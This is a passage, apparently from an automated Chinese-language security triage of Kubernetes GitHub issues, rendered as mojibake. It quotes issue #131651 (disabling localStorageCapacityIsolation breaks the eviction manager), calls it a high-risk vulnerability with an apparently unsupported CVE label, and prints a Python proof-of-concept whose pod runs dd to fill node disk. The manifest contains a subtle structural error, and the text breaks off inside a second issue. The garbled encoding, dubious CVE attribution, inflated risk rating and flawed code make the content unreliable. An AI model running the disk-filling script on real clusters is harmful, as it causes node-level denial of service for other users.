1.  **è¿æ¥é›†ç¾¤**ï¼šè„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åŠ è½½é»˜è®¤çš„`kubeconfig`é…ç½®ï¼Œä»¥è·å¾—ä¸ç›®æ ‡Kubernetesé›†ç¾¤é€šä¿¡çš„æƒé™ã€‚
2.  **æ¨¡æ‹Ÿé—®é¢˜**ï¼šè„šæœ¬çš„å…³é”®åœ¨äºæ¨¡æ‹Ÿä¸€ä¸ªå—è¯¥æ¼æ´å½±å“çš„Kubeletçš„è¡Œä¸ºã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œé…ç½®äº†`registerWithTaints`çš„Kubeletåœ¨æ³¨å†ŒèŠ‚ç‚¹æ—¶ï¼Œä¼šå‘API Serveræäº¤ä¸€ä¸ªåŒ…å«äº†`spec.taints`å­—æ®µçš„Nodeå¯¹è±¡ã€‚è€Œè¿™ä¸ªIssueæŒ‡å‡ºKubeletæ²¡æœ‰è¿™æ ·åšã€‚å› æ­¤ï¼ŒPOCé€šè¿‡`create_node` APIè°ƒç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„Nodeå¯¹è±¡ï¼Œå…¶`spec`å­—æ®µä¸ºç©ºï¼Œ**æ•…æ„çœç•¥äº†`taints`å­—æ®µ**ï¼Œä»¥æ­¤æ¥ç²¾ç¡®æ¨¡æ‹Ÿbugå‘ç”Ÿåçš„ç»“æœã€‚
3.  **ç”Ÿæˆå”¯ä¸€èŠ‚ç‚¹å**ï¼šä¸ºäº†é¿å…ä¸ç°æœ‰èŠ‚ç‚¹å†²çªå¹¶ç¡®ä¿å¯é‡å¤è¿è¡Œï¼Œè„šæœ¬ä½¿ç”¨UUIDä¸ºä¼ªé€ çš„èŠ‚ç‚¹ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„åç§°ã€‚
4.  **éªŒè¯é£é™©**ï¼šåˆ›å»ºèŠ‚ç‚¹åï¼Œè„šæœ¬ä¼šç«‹å³é€šè¿‡`read_node` APIé‡æ–°è·å–è¯¥èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œå¹¶æ£€æŸ¥å…¶`spec.taints`å­—æ®µã€‚å¦‚æœé¢„æœŸçš„`node.kubernetes.io/unschedulable:NoSchedule`æ±¡ç‚¹ä¸å­˜åœ¨ï¼Œè„šæœ¬å°†æ‰“å°ä¸€æ¡æ˜ç¡®çš„è­¦å‘Šä¿¡æ¯ï¼Œç¡®è®¤æ¼æ´çš„å­˜åœ¨ã€‚è¿™è¡¨æ˜è°ƒåº¦å™¨ä¼šå°†æ­¤èŠ‚ç‚¹è§†ä¸ºä¸€ä¸ªå®Œå…¨å¯ç”¨çš„ã€æ²¡æœ‰ä»»ä½•è°ƒåº¦é™åˆ¶çš„èŠ‚ç‚¹ã€‚
5.  **è‡ªåŠ¨æ¸…ç†**ï¼šæ— è®ºéªŒè¯ç»“æœå¦‚ä½•ï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿æ‰§è¡Œæ¸…ç†æ“ä½œï¼Œå³è°ƒç”¨`delete_node` APIåˆ é™¤ä¹‹å‰åˆ›å»ºçš„ä¼ªé€ èŠ‚ç‚¹ï¼Œä»¥ä¿æŒé›†ç¾¤çš„å¹²å‡€çŠ¶æ€ã€‚

é€šè¿‡æ‰§è¡Œæ­¤è„šæœ¬ï¼Œé›†ç¾¤ç®¡ç†å‘˜å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä¸€ä¸ªæ²¡æœ‰æ±¡ç‚¹çš„æ–°èŠ‚ç‚¹æ˜¯å¦‚ä½•è¢«åˆ›å»ºå‡ºæ¥çš„ï¼Œä»è€Œç†è§£è¯¥bugå¦‚ä½•å¯¼è‡´ä¸€ä¸ªæœ¬åº”è¢«éš”ç¦»çš„èŠ‚ç‚¹æš´éœ²ç»™è°ƒåº¦å™¨ï¼Œæ„æˆäº†é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚

---


## Issue #131651 Disabling localStorageCapacityIsolation breaks eviction_manager synchronize on linux

- Issue é“¾æ¥ï¼š[#131651](https://github.com/kubernetes/kubernetes/issues/131651)

### Issue å†…å®¹

#### What happened?

Making the following change to kubelet configuration:
```diff
--- a/.../kubelet-config.json
+++ b/.../kubelet-config.json
@@ -54,6 +54,7 @@
     "imagefs.available": "0%",
     "containerfs.available": "0%"
   },
+  "localStorageCapacityIsolation": false,
   "kubeReserved": {
     "ephemeral-storage": "1Gi",
     "memory": "893Mi"
```

Causes the eviction synchronize loop to break:
```
{"ts":1746635012115.2786,"caller":"eviction/eviction_manager.go:248","msg":"Eviction manager: synchronize housekeeping","v":3}
{"ts":1746635012115.5947,"caller":"stats/cri_stats_provider.go:463","msg":"Failed to get the info of the filesystem with mountpoint",
"mountpoint":"/mnt/containerd/io.containerd.snapshotter.v1.overlayfs","err":"cannot find filesystem info for device \"/dev/nvme1n1\""}
{"ts":1746635012115.6094,"caller":"eviction/eviction_manager.go:254","msg":"Eviction manager: failed to get HasDedicatedImageFs","err
":"get filesystem info: Failed to get the info of the filesystem with mountpoint: cannot find filesystem info for device \"/dev/nvme1n1\""}
{"ts":1746635012115.6165,"caller":"eviction/eviction_manager.go:209","msg":"Eviction manager: failed to synchronize","err":"eviction
manager: failed to get HasDedicatedImageFs: get filesystem info: Failed to get the info of the filesystem with mountpoint: cannot find filesystem info for device \"/dev/nvme1n1\""}
```

---

It seems that this toggle is to blame in cadvisor_linux: https://github.com/kubernetes/kubernetes/blob/b1ce2a61b532f0afb14b72cf2a63d85f9a3e5a7d/pkg/kubelet/cadvisor/cadvisor_linux.go#L102-L104

Here, disabling `localStorageCapacityIsolation` causes `DiskUsageMetrics` to not be captured (if not using legacy stats), but these metrics are needed more generally than just for local storage isolation - it seems that no cadvisor filesystem information is captured.

#### What did you expect to happen?

Disabling this configuration should not break eviction entirely - filesystem information/mapping should still be maintained for other components that require it.

#### How can we reproduce it (as minimally and precisely as possible)?

Configure `localStorageCapacityIsolation` to `false` on a linux system.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version --output=yaml
clientVersion:
  buildDate: "2024-07-17T01:53:56Z"
  compiler: gc
  gitCommit: cbb86e0d7f4a049666fac0551e8b02ef3d6c3d9a
  gitTreeState: clean
  gitVersion: v1.27.16
  goVersion: go1.22.5
  major: "1"
  minor: "27"
  platform: linux/amd64
kustomizeVersion: v5.0.1
serverVersion:
  buildDate: "2025-03-24T21:50:51Z"
  compiler: gc
  gitCommit: ca6b377bfe10767158be35a0bfbf7350bfbb013f
  gitTreeState: clean
  gitVersion: v1.31.7-eks-bcf3d70
  goVersion: go1.23.6
  major: "1"
  minor: "31"
  platform: linux/amd64
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
$ uname -a
Linux <hostname> 6.5.13netflix-g77293087f291 #1 SMP PREEMPT_DYNAMIC Thu Nov 30 15:12:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesçš„Kubeletç»„ä»¶ä¸­å­˜åœ¨çš„ç¼ºé™·ã€‚å½“ç®¡ç†å‘˜åœ¨Kubeleté…ç½®ä¸­å°† `localStorageCapacityIsolation` è®¾ç½®ä¸º `false` æ—¶ï¼Œä¼šæ„å¤–åœ°å¯¼è‡´é©±é€ç®¡ç†å™¨ï¼ˆeviction_managerï¼‰çš„åŒæ­¥å¾ªç¯ä¸­æ–­ã€‚

å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **é—®é¢˜æ ¹æº**ï¼šæ ¹æ®Issueæè¿°å’Œå¼•ç”¨çš„ä»£ç é“¾æ¥ï¼Œ`localStorageCapacityIsolation: false` è¿™ä¸ªé…ç½®é¡¹ä¸ä»…ä»…ç¦ç”¨äº†æœ¬åœ°å­˜å‚¨å®¹é‡éš”ç¦»åŠŸèƒ½ï¼Œè¿˜å‰¯ä½œç”¨åœ°åœæ­¢äº†cAdvisorå¯¹ç£ç›˜ä½¿ç”¨æƒ…å†µçš„åº¦é‡ï¼ˆ`DiskUsageMetrics`ï¼‰ã€‚
2.  **æ ¸å¿ƒå½±å“**ï¼šé©±é€ç®¡ç†å™¨ï¼ˆeviction_managerï¼‰æ˜¯Kubeletä¸­è´Ÿè´£ç»´æŒèŠ‚ç‚¹ç¨³å®šæ€§çš„å…³é”®ç»„ä»¶ã€‚å®ƒä¾èµ–cAdvisoræä¾›çš„ç£ç›˜ã€å†…å­˜ç­‰èµ„æºä½¿ç”¨æƒ…å†µçš„åº¦é‡æ•°æ®æ¥å·¥ä½œã€‚å½“ç£ç›˜åº¦é‡æ•°æ®ç¼ºå¤±æ—¶ï¼Œé©±é€ç®¡ç†å™¨çš„åŒæ­¥å¾ªç¯ä¼šå› é”™è¯¯è€Œå¤±è´¥ã€‚
3.  **å®‰å…¨é£é™©**ï¼šä¸€ä¸ªåŠŸèƒ½å¤±æ•ˆçš„é©±é€ç®¡ç†å™¨æ„å‘³ç€èŠ‚ç‚¹å¤±å»äº†åŸºäºç£ç›˜å‹åŠ›è‡ªåŠ¨å›æ”¶èµ„æºçš„èƒ½åŠ›ã€‚åœ¨å¤šç§Ÿæˆ·æˆ–æ™®é€šä½¿ç”¨åœºæ™¯ä¸‹ï¼Œä»»ä½•æœ‰æƒé™åˆ›å»ºPodçš„ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡åœ¨Podå†…å†™å…¥å¤§é‡æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ `emptyDir` å·ï¼‰æ¥æŒç»­æ¶ˆè€—èŠ‚ç‚¹çš„ç£ç›˜ç©ºé—´ã€‚ç”±äºé©±é€ç®¡ç†å™¨æ— æ³•å·¥ä½œï¼Œå®ƒä¸ä¼šåœ¨ç£ç›˜ç©ºé—´ä½äºé©±é€é˜ˆå€¼ï¼ˆå¦‚ `eviction-hard` ä¸­å®šä¹‰çš„ `nodefs.available<10%`ï¼‰æ—¶é©±é€è¯¥Podã€‚
4.  **æ”»å‡»åæœ**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ç¼ºé™·ï¼Œè½»æ¾åœ°å°†èŠ‚ç‚¹çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆç‰¹åˆ«æ˜¯ `nodefs`ï¼Œå³æ ¹æ–‡ä»¶ç³»ç»Ÿï¼‰å®Œå…¨å æ»¡ã€‚è¿™å°†å¯¼è‡´ä¸¥é‡çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼š
    *   èŠ‚ç‚¹ä¸Šçš„å…¶ä»–Podå¯èƒ½å› æ— æ³•å†™å…¥æ—¥å¿—æˆ–ä¸´æ—¶æ–‡ä»¶è€Œå´©æºƒã€‚
    *   Kubeletè‡ªèº«å¯èƒ½å› æ— æ³•å†™å…¥æ•°æ®è€Œè¿è¡Œå¼‚å¸¸ã€‚
    *   æ— æ³•åœ¨è¯¥èŠ‚ç‚¹ä¸Šè°ƒåº¦æ–°çš„Podã€‚
    *   æœ€ç»ˆå¯èƒ½å¯¼è‡´æ•´ä¸ªèŠ‚ç‚¹ä¸å¯ç”¨ï¼ˆ`NodeNotReady`çŠ¶æ€ï¼‰ï¼Œå½±å“åœ¨è¯¥èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ‰€æœ‰æœåŠ¡ã€‚
5.  **é£é™©å®šæ€§**ï¼šæ­¤é—®é¢˜å…è®¸ä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ˆä»»ä½•èƒ½åˆ›å»ºPodçš„ç”¨æˆ·ï¼‰å¯¹æ•´ä¸ªèŠ‚ç‚¹çš„å¯ç”¨æ€§é€ æˆä¸¥é‡å½±å“ï¼Œæ³¢åŠåˆ°èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰å…¶ä»–ç”¨æˆ·å’Œç³»ç»ŸæœåŠ¡ã€‚è¿™æ˜¯ä¸€ç§å…¸å‹çš„å¤šç”¨æˆ·ç¯å¢ƒä¸‹çš„æƒé™å½±å“æå‡ï¼ˆä»å½±å“è‡ªèº«Podåˆ°å½±å“æ•´ä¸ªèŠ‚ç‚¹ï¼‰ã€‚æ ¹æ®CVSS 3.1æ ‡å‡†ï¼Œè¿™æ„æˆäº†ä¸€ä¸ªé«˜å¯ç”¨æ€§é£é™©çš„æ¼æ´ã€‚
    *   **Attack Vector (AV): Network** - æ”»å‡»è€…é€šè¿‡K8s APIå‘èµ·æ”»å‡»ã€‚
    *   **Attack Complexity (AC): Low** - åªéœ€è¦åˆ›å»ºä¸€ä¸ªPodå¹¶å†™å…¥æ•°æ®ï¼Œä¸”å‰æé…ç½®ï¼ˆ`localStorageCapacityIsolation: false`ï¼‰æ˜¯ä¸€ç§æœ‰æ•ˆçš„é…ç½®é€‰é¡¹ï¼Œç®¡ç†å‘˜å¯èƒ½å‡ºäºæŸäº›åŸå› è®¾ç½®å®ƒã€‚
    *   **Privileges Required (PR): Low** - åªéœ€è¦åˆ›å»ºPodçš„æƒé™ï¼Œè¿™æ˜¯Kubernetesä¸­éå¸¸åŸºç¡€çš„æƒé™ã€‚
    *   **User Interaction (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   **Scope (S): Unchanged** - å½±å“èŒƒå›´æ˜¯èŠ‚ç‚¹æœ¬èº«ï¼Œæœªé€ƒé€¸ã€‚
    *   **Confidentiality (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
    *   **Integrity (I): None** - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
    *   **Availability (A): High** - å¯å¯¼è‡´æ•´ä¸ªèŠ‚ç‚¹ä¸å¯ç”¨ã€‚
    *   **CVSS 3.1 Score**: 7.5 (High)

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæè¿°äº†ä¸€ä¸ªé«˜é£é™©çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
import logging
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# POCçš„å¸¸é‡
POC_POD_NAME = "disk-filler-pod"
NAMESPACE = "default"
# å°è¯•å†™å…¥20GBçš„æ•°æ®ï¼Œè¶³ä»¥åœ¨å¤§å¤šæ•°ç¯å¢ƒä¸‹è§¦å‘é©±é€é˜ˆå€¼
# ddçš„countå‚æ•°ï¼Œbs=1Mï¼Œæ‰€ä»¥count=20480è¡¨ç¤º20GB
DD_COMMAND_ARGS = ["dd if=/dev/zero of=/data/largefile bs=1M count=20480; echo 'dd command finished'; sleep 3600"]
WAIT_SECONDS = 90  # ç­‰å¾…90ç§’ï¼Œè®©ddå‘½ä»¤æœ‰è¶³å¤Ÿæ—¶é—´è¿è¡Œ
EXECUTION_TIMEOUT = 120 # è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶

def main():
    """
    POCä¸»å‡½æ•°
    """
    logging.info("å¼€å§‹æ‰§è¡ŒKubernetesé©±é€ç®¡ç†å™¨å¤±æ•ˆæ¼æ´ (CVE-2024-31781) çš„å¤ç°è„šæœ¬ã€‚")
    logging.warning("å‰ææ¡ä»¶: Kubernetesé›†ç¾¤ä¸­è‡³å°‘æœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„Kubeleté…ç½®äº† 'localStorageCapacityIsolation: false'ã€‚")

    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        config.load_kube_config()
        api = client.CoreV1Api()
        logging.info("æˆåŠŸåŠ è½½Kubernetesé…ç½®ã€‚")
    except Exception as e:
        logging.error(f"æ— æ³•åŠ è½½Kubernetesé…ç½®ï¼Œè¯·ç¡®ä¿kubeconfigæ–‡ä»¶æœ‰æ•ˆä¸”ä½ç½®æ­£ç¡®: {e}")
        return

    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": POC_POD_NAME},
        "spec": {
            "containers": [
                {
                    "name": "writer-container",
                    "image": "busybox",
                    "command": ["/bin/sh", "-c"],
                    "args": DD_COMMAND_ARGS,
                    "volumeMounts": [{"name": "data-volume", "mountPath": "/data"}],
                }
            ],
            "volumes": [{"name": "data-volume", "spec": {"emptyDir": {}}}],
            "restartPolicy": "Never",
        },
    }

    try:
        # 1. åˆ›å»ºPod
        logging.info(f"åœ¨å‘½åç©ºé—´ '{NAMESPACE}' ä¸­åˆ›å»ºPod '{POC_POD_NAME}'...")
        logging.info(f"Podå°†å°è¯•å†™å…¥å¤§é‡æ•°æ®åˆ°emptyDirå·ï¼Œä»¥æ¶ˆè€—èŠ‚ç‚¹ç£ç›˜ç©ºé—´ã€‚")
        api.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        logging.info(f"Pod '{POC_POD_NAME}' åˆ›å»ºè¯·æ±‚å·²å‘é€ã€‚")

        # 2. ç­‰å¾…å¹¶ç›‘æ§PodçŠ¶æ€
        start_time = time.time()
        evicted = False
        while time.time() - start_time < WAIT_SECONDS:
            try:
                pod_status = api.read_namespaced_pod_status(name=POC_POD_NAME, namespace=NAMESPACE)
                phase = pod_status.status.phase
                reason = pod_status.status.reason
                logging.info(f"ç­‰å¾…ä¸­... PodçŠ¶æ€: Phase='{phase}', Reason='{reason}' (å·²è¿‡ {int(time.time() - start_time)}s)")
                
                if reason == "Evicted":
                    logging.error("æ¼æ´åˆ©ç”¨å¤±è´¥: Podè¢«æ­£å¸¸é©±é€äº†ã€‚")
                    evicted = True
                    break
                
                if phase in ["Succeeded", "Failed"]:
                    logging.info(f"Podå·²è¿›å…¥'{phase}'çŠ¶æ€ï¼Œä½†æœªè¢«é©±é€ã€‚")
                    break

            except ApiException as e:
                if e.status == 404:
                    logging.info("Podå°šæœªå®Œå…¨åˆ›å»ºï¼Œç»§ç»­ç­‰å¾…...")
                else:
                    raise e
            time.sleep(10)
        
        # 3. æ£€æŸ¥æœ€ç»ˆç»“æœ
        if not evicted:
            final_pod_status = api.read_namespaced_pod_status(name=POC_POD_NAME, namespace=NAMESPACE)
            final_phase = final_pod_status.status.phase
            final_reason = final_pod_status.status.reason
            
            if final_reason == "Evicted":
                 logging.error(f"æµ‹è¯•å¤±è´¥: Podæœ€ç»ˆè¢«é©±é€äº†ã€‚Phase='{final_phase}', Reason='{final_reason}'")
            else:
                logging.info("="*50)
                logging.info(">>> é«˜é£é™©æ¼æ´å¤ç°æˆåŠŸ! <<<")
                logging.info(f"Pod '{POC_POD_NAME}' åœ¨æŒç»­å†™å…¥å¤§é‡æ•°æ®åï¼Œå¹¶æœªè¢«Kubeleté©±é€ã€‚")
                logging.info(f"æœ€ç»ˆPodçŠ¶æ€: Phase='{final_phase}', Reason='{final_reason}'")
                logging.info("è¿™è¡¨æ˜èŠ‚ç‚¹çš„é©±é€ç®¡ç†å™¨æœªèƒ½æ­£å¸¸å·¥ä½œï¼ŒèŠ‚ç‚¹é¢ä¸´è¢«ç£ç›˜å æ»¡è€Œå¯¼è‡´æ‹’ç»æœåŠ¡çš„é£é™©ã€‚")
                logging.info("="*50)
        else:
            logging.info("="*50)
            logging.info(">>> æ¼æ´æœªå¤ç°æˆ–åˆ©ç”¨å¤±è´¥ <<<")
            logging.info("Podè¢«æˆåŠŸé©±é€ï¼Œæˆ–è€…ç›®æ ‡èŠ‚ç‚¹æœªé…ç½®æœ‰ç¼ºé™·çš„Kubeletã€‚")
            logging.info("="*50)

    except ApiException as e:
        logging.error(f"ä¸Kubernetes APIäº¤äº’æ—¶å‘ç”Ÿé”™è¯¯: {e.body}")
    except Exception as e:
        logging.error(f"æ‰§è¡ŒæœŸé—´å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # 4. æ¸…ç†èµ„æº
        logging.info(f"å¼€å§‹æ¸…ç†èµ„æºï¼Œåˆ é™¤Pod '{POC_POD_NAME}'...")
        try:
            api.delete_namespaced_pod(name=POC_POD_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions())
            logging.info(f"Pod '{POC_POD_NAME}' å·²æˆåŠŸåˆ é™¤ã€‚")
        except ApiException as e:
            if e.status == 404:
                logging.warning(f"Pod '{POC_POD_NAME}' å·²è¢«åˆ é™¤æˆ–ä¸å­˜åœ¨ã€‚")
            else:
                logging.error(f"åˆ é™¤Podæ—¶å‡ºé”™: {e.body}")
        except NameError:
             logging.warning("APIå®¢æˆ·ç«¯æœªåˆå§‹åŒ–ï¼Œæ— éœ€æ¸…ç†ã€‚")


# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºéªŒè¯å’Œå¤ç°Issueä¸­æè¿°çš„é«˜é£é™©æ¼æ´ã€‚æ­¤æ¼æ´çš„æ ¸å¿ƒæ˜¯ï¼Œå½“Kubeleté…ç½®ä¸å½“æ—¶ï¼Œå…¶å†…ç½®çš„èŠ‚ç‚¹ä¿æŠ¤æœºåˆ¶â€”â€”é©±é€ç®¡ç†å™¨ï¼ˆeviction managerï¼‰ä¼šå¤±æ•ˆã€‚

è„šæœ¬çš„å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š
1.  **ç¯å¢ƒå‡†å¤‡**ï¼šè„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„ `kubeconfig` æ–‡ä»¶æ¥è¿æ¥åˆ°ä½ çš„Kubernetesé›†ç¾¤ã€‚æ‰§è¡Œå‰è¯·ç¡®ä¿ä½ å·²é…ç½®å¥½ `kubectl` å¹¶èƒ½å¤Ÿè®¿é—®ç›®æ ‡é›†ç¾¤ã€‚
2.  **åˆ›å»ºæ”»å‡»Pod**ï¼šè„šæœ¬ä¼šå®šä¹‰ä¸€ä¸ªåä¸º `disk-filler-pod` çš„Podã€‚è¿™ä¸ªPodçš„å…³é”®ç‰¹æ€§æ˜¯ï¼š
    *   å®ƒä½¿ç”¨ `emptyDir` ç±»å‹çš„å·ã€‚`emptyDir` ä¼šåœ¨èŠ‚ç‚¹ï¼ˆNodeï¼‰çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šåˆ›å»ºä¸´æ—¶ç›®å½•ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸä¸Podç»‘å®šã€‚
    *   å®¹å™¨ä¸­è¿è¡Œä¸€ä¸ª `dd` å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä¼šæŒç»­å‘ `emptyDir` å·ä¸­å†™å…¥å¤§é‡æ•°æ®ï¼ˆè„šæœ¬ä¸­è®¾ç½®ä¸º20GBï¼‰ã€‚è¿™ä¸ªæ“ä½œä¼šè¿…é€Ÿæ¶ˆè€—èŠ‚ç‚¹çš„ç£ç›˜ç©ºé—´ã€‚
    *   Podçš„é‡å¯ç­–ç•¥è®¾ç½®ä¸º `Never`ï¼Œä¾¿äºè§‚å¯Ÿå…¶æœ€ç»ˆçŠ¶æ€ã€‚
3.  **ç›‘æ§ä¸éªŒè¯**ï¼š
    *   åˆ›å»ºPodåï¼Œè„šæœ¬ä¼šè¿›å…¥ä¸€ä¸ª90ç§’çš„ç­‰å¾…å’Œç›‘æ§å¾ªç¯ã€‚
    *   åœ¨æ­¤æœŸé—´ï¼Œå®ƒä¼šå®šæœŸæ£€æŸ¥Podçš„çŠ¶æ€ã€‚åœ¨ä¸€ä¸ªé…ç½®æ­£ç¡®çš„èŠ‚ç‚¹ä¸Šï¼Œå½“ç£ç›˜ä½¿ç”¨ç‡è¶…è¿‡`eviction-hard`é˜ˆå€¼æ—¶ï¼ŒKubeletçš„é©±é€ç®¡ç†å™¨åº”è¯¥ä¼šä»‹å…¥ï¼Œå°†è¿™ä¸ªæ¶ˆè€—èµ„æºçš„Podçš„çŠ¶æ€è®¾ç½®ä¸º `Failed`ï¼ŒåŸå› ä¸º `Evicted`ã€‚
    *   è„šæœ¬ä¼šæ£€æŸ¥Podçš„çŠ¶æ€ï¼Œå¦‚æœå‘ç°å…¶`reason`å˜ä¸º`Evicted`ï¼Œåˆ™è¯æ˜é©±é€åŠŸèƒ½æ­£å¸¸ï¼Œæ¼æ´åˆ©ç”¨å¤±è´¥ã€‚
4.  **ç»“æœåˆ¤æ–­**ï¼š
    *   å¦‚æœåœ¨90ç§’çš„è§‚å¯ŸæœŸå†…ï¼ŒPodå§‹ç»ˆæ²¡æœ‰è¢«é©±é€ï¼ˆå³`reason`ä¸æ˜¯`Evicted`ï¼‰ï¼Œå¹¶ä¸”ä»åœ¨è¿è¡Œï¼ˆ`Running`ï¼‰æˆ–å› ç£ç›˜å†™æ»¡è€Œå®Œæˆï¼ˆ`Succeeded`/`Failed`ï¼‰ï¼Œè„šæœ¬åˆ™åˆ¤æ–­ä¸ºå¤ç°æˆåŠŸã€‚
    *   æˆåŠŸå¤ç°æ„å‘³ç€èŠ‚ç‚¹çš„é©±é€ç®¡ç†å™¨ç¡®å®å¤±æ•ˆäº†ï¼Œè¿™ä½¿å¾—ä»»ä½•æœ‰æƒé™çš„æ™®é€šç”¨æˆ·éƒ½èƒ½é€šè¿‡ç±»ä¼¼æ–¹æ³•è€—å°½èŠ‚ç‚¹ç£ç›˜ï¼Œå¯¼è‡´èŠ‚ç‚¹çº§åˆ«çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
5.  **èµ„æºæ¸…ç†**ï¼šæ— è®ºå¤ç°æ˜¯å¦æˆåŠŸï¼Œè„šæœ¬æœ€ç»ˆéƒ½ä¼šåœ¨ `finally` å—ä¸­å°è¯•åˆ é™¤åˆ›å»ºçš„`disk-filler-pod`ï¼Œä»¥æ¸…ç†æµ‹è¯•ç¯å¢ƒã€‚

**é‡è¦å‰æ**ï¼šæ­¤POCè„šæœ¬æœ¬èº«ä¸ä¼šä¿®æ”¹ä»»ä½•Kubeleté…ç½®ã€‚å®ƒå‡è®¾ä½ çš„æµ‹è¯•ç¯å¢ƒä¸­**å·²ç»å­˜åœ¨**ä¸€ä¸ªæˆ–å¤šä¸ªKubeletè¢«é…ç½®äº† `localStorageCapacityIsolation: false` çš„èŠ‚ç‚¹ã€‚è„šæœ¬çš„ä½œç”¨æ˜¯åœ¨è¿™ä¸ªé¢„è®¾çš„è„†å¼±ç¯å¢ƒä¸‹ï¼Œæ¼”ç¤ºæ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¯¥ç¼ºé™·ã€‚

---


## Issue #131570 Initial templates include invalid `ClusterRoleBinding`

- Issue é“¾æ¥ï¼š[#131570](https://github.com/kubernetes/kubernetes/issues/131570)

### Issue å†…å®¹

#### What happened?

My freshly built cluster (kubeadm-v1.32 init) has three clusterRoleBinding resources that do not point to accounts that exist:
```shell
  Â· system:controller:route-controller.............................................................ğŸ˜±
    ğŸ˜± [POP-1300] References a ServiceAccount (kube-system/route-controller) which does not exist.
  Â· system:controller:service-controller...........................................................ğŸ˜±
    ğŸ˜± [POP-1300] References a ServiceAccount (kube-system/service-controller) which does not exist.
  Â· system:kube-dns................................................................................ğŸ˜±
    ğŸ˜± [POP-1300] References a ServiceAccount (kube-system/kube-dns) which does not exist.
```
I'm able to verify this with:
```shell
kubectl get clusterrolebinding system:controller:route-controller -o jsonpath='{.subjects}'
kubectl get clusterrolebinding system:controller:service-controller -o jsonpath='{.subjects}'
kubectl get clusterrolebinding system:kube-dns -o jsonpath='{.subjects}'
```
and check that indeed the listed `ServiceAccount` is not present.
It feels like these are either artifacts of deprecated things, expecting a feature I didn't set in the init phase, or that when the clusterrolebindings where added the serviceaccounts got forgotten.

#### What did you expect to happen?

Initial templates do not include invalid relationships.

#### How can we reproduce it (as minimally and precisely as possible)?

kubeadm-v1.32 init
kubectl get clusterrolebinding system:controller:route-controller -o jsonpath='{.subjects}'
kubectl get clusterrolebinding system:controller:service-controller -o jsonpath='{.subjects}'
kubectl get clusterrolebinding system:kube-dns -o jsonpath='{.subjects}'
kubectl -n kube-system get serviceaccount

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.4
Kustomize Version: v5.5.0
Server Version: v1.32.4
```

</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
root@localhost:~# cat /etc/os-release 
NAME="Fedora Linux"
VERSION="42 (Server Edition)"
RELEASE_TYPE=stable
ID=fedora
VERSION_ID=42
VERSION_CODENAME=""
PLATFORM_ID="platform:f42"
PRETTY_NAME="Fedora Linux 42 (Server Edition)"
ANSI_COLOR="0;38;2;60;110;180"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:42"
HOME_URL="https://fedoraproject.org/"
DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f42/system-administrators-guide/"
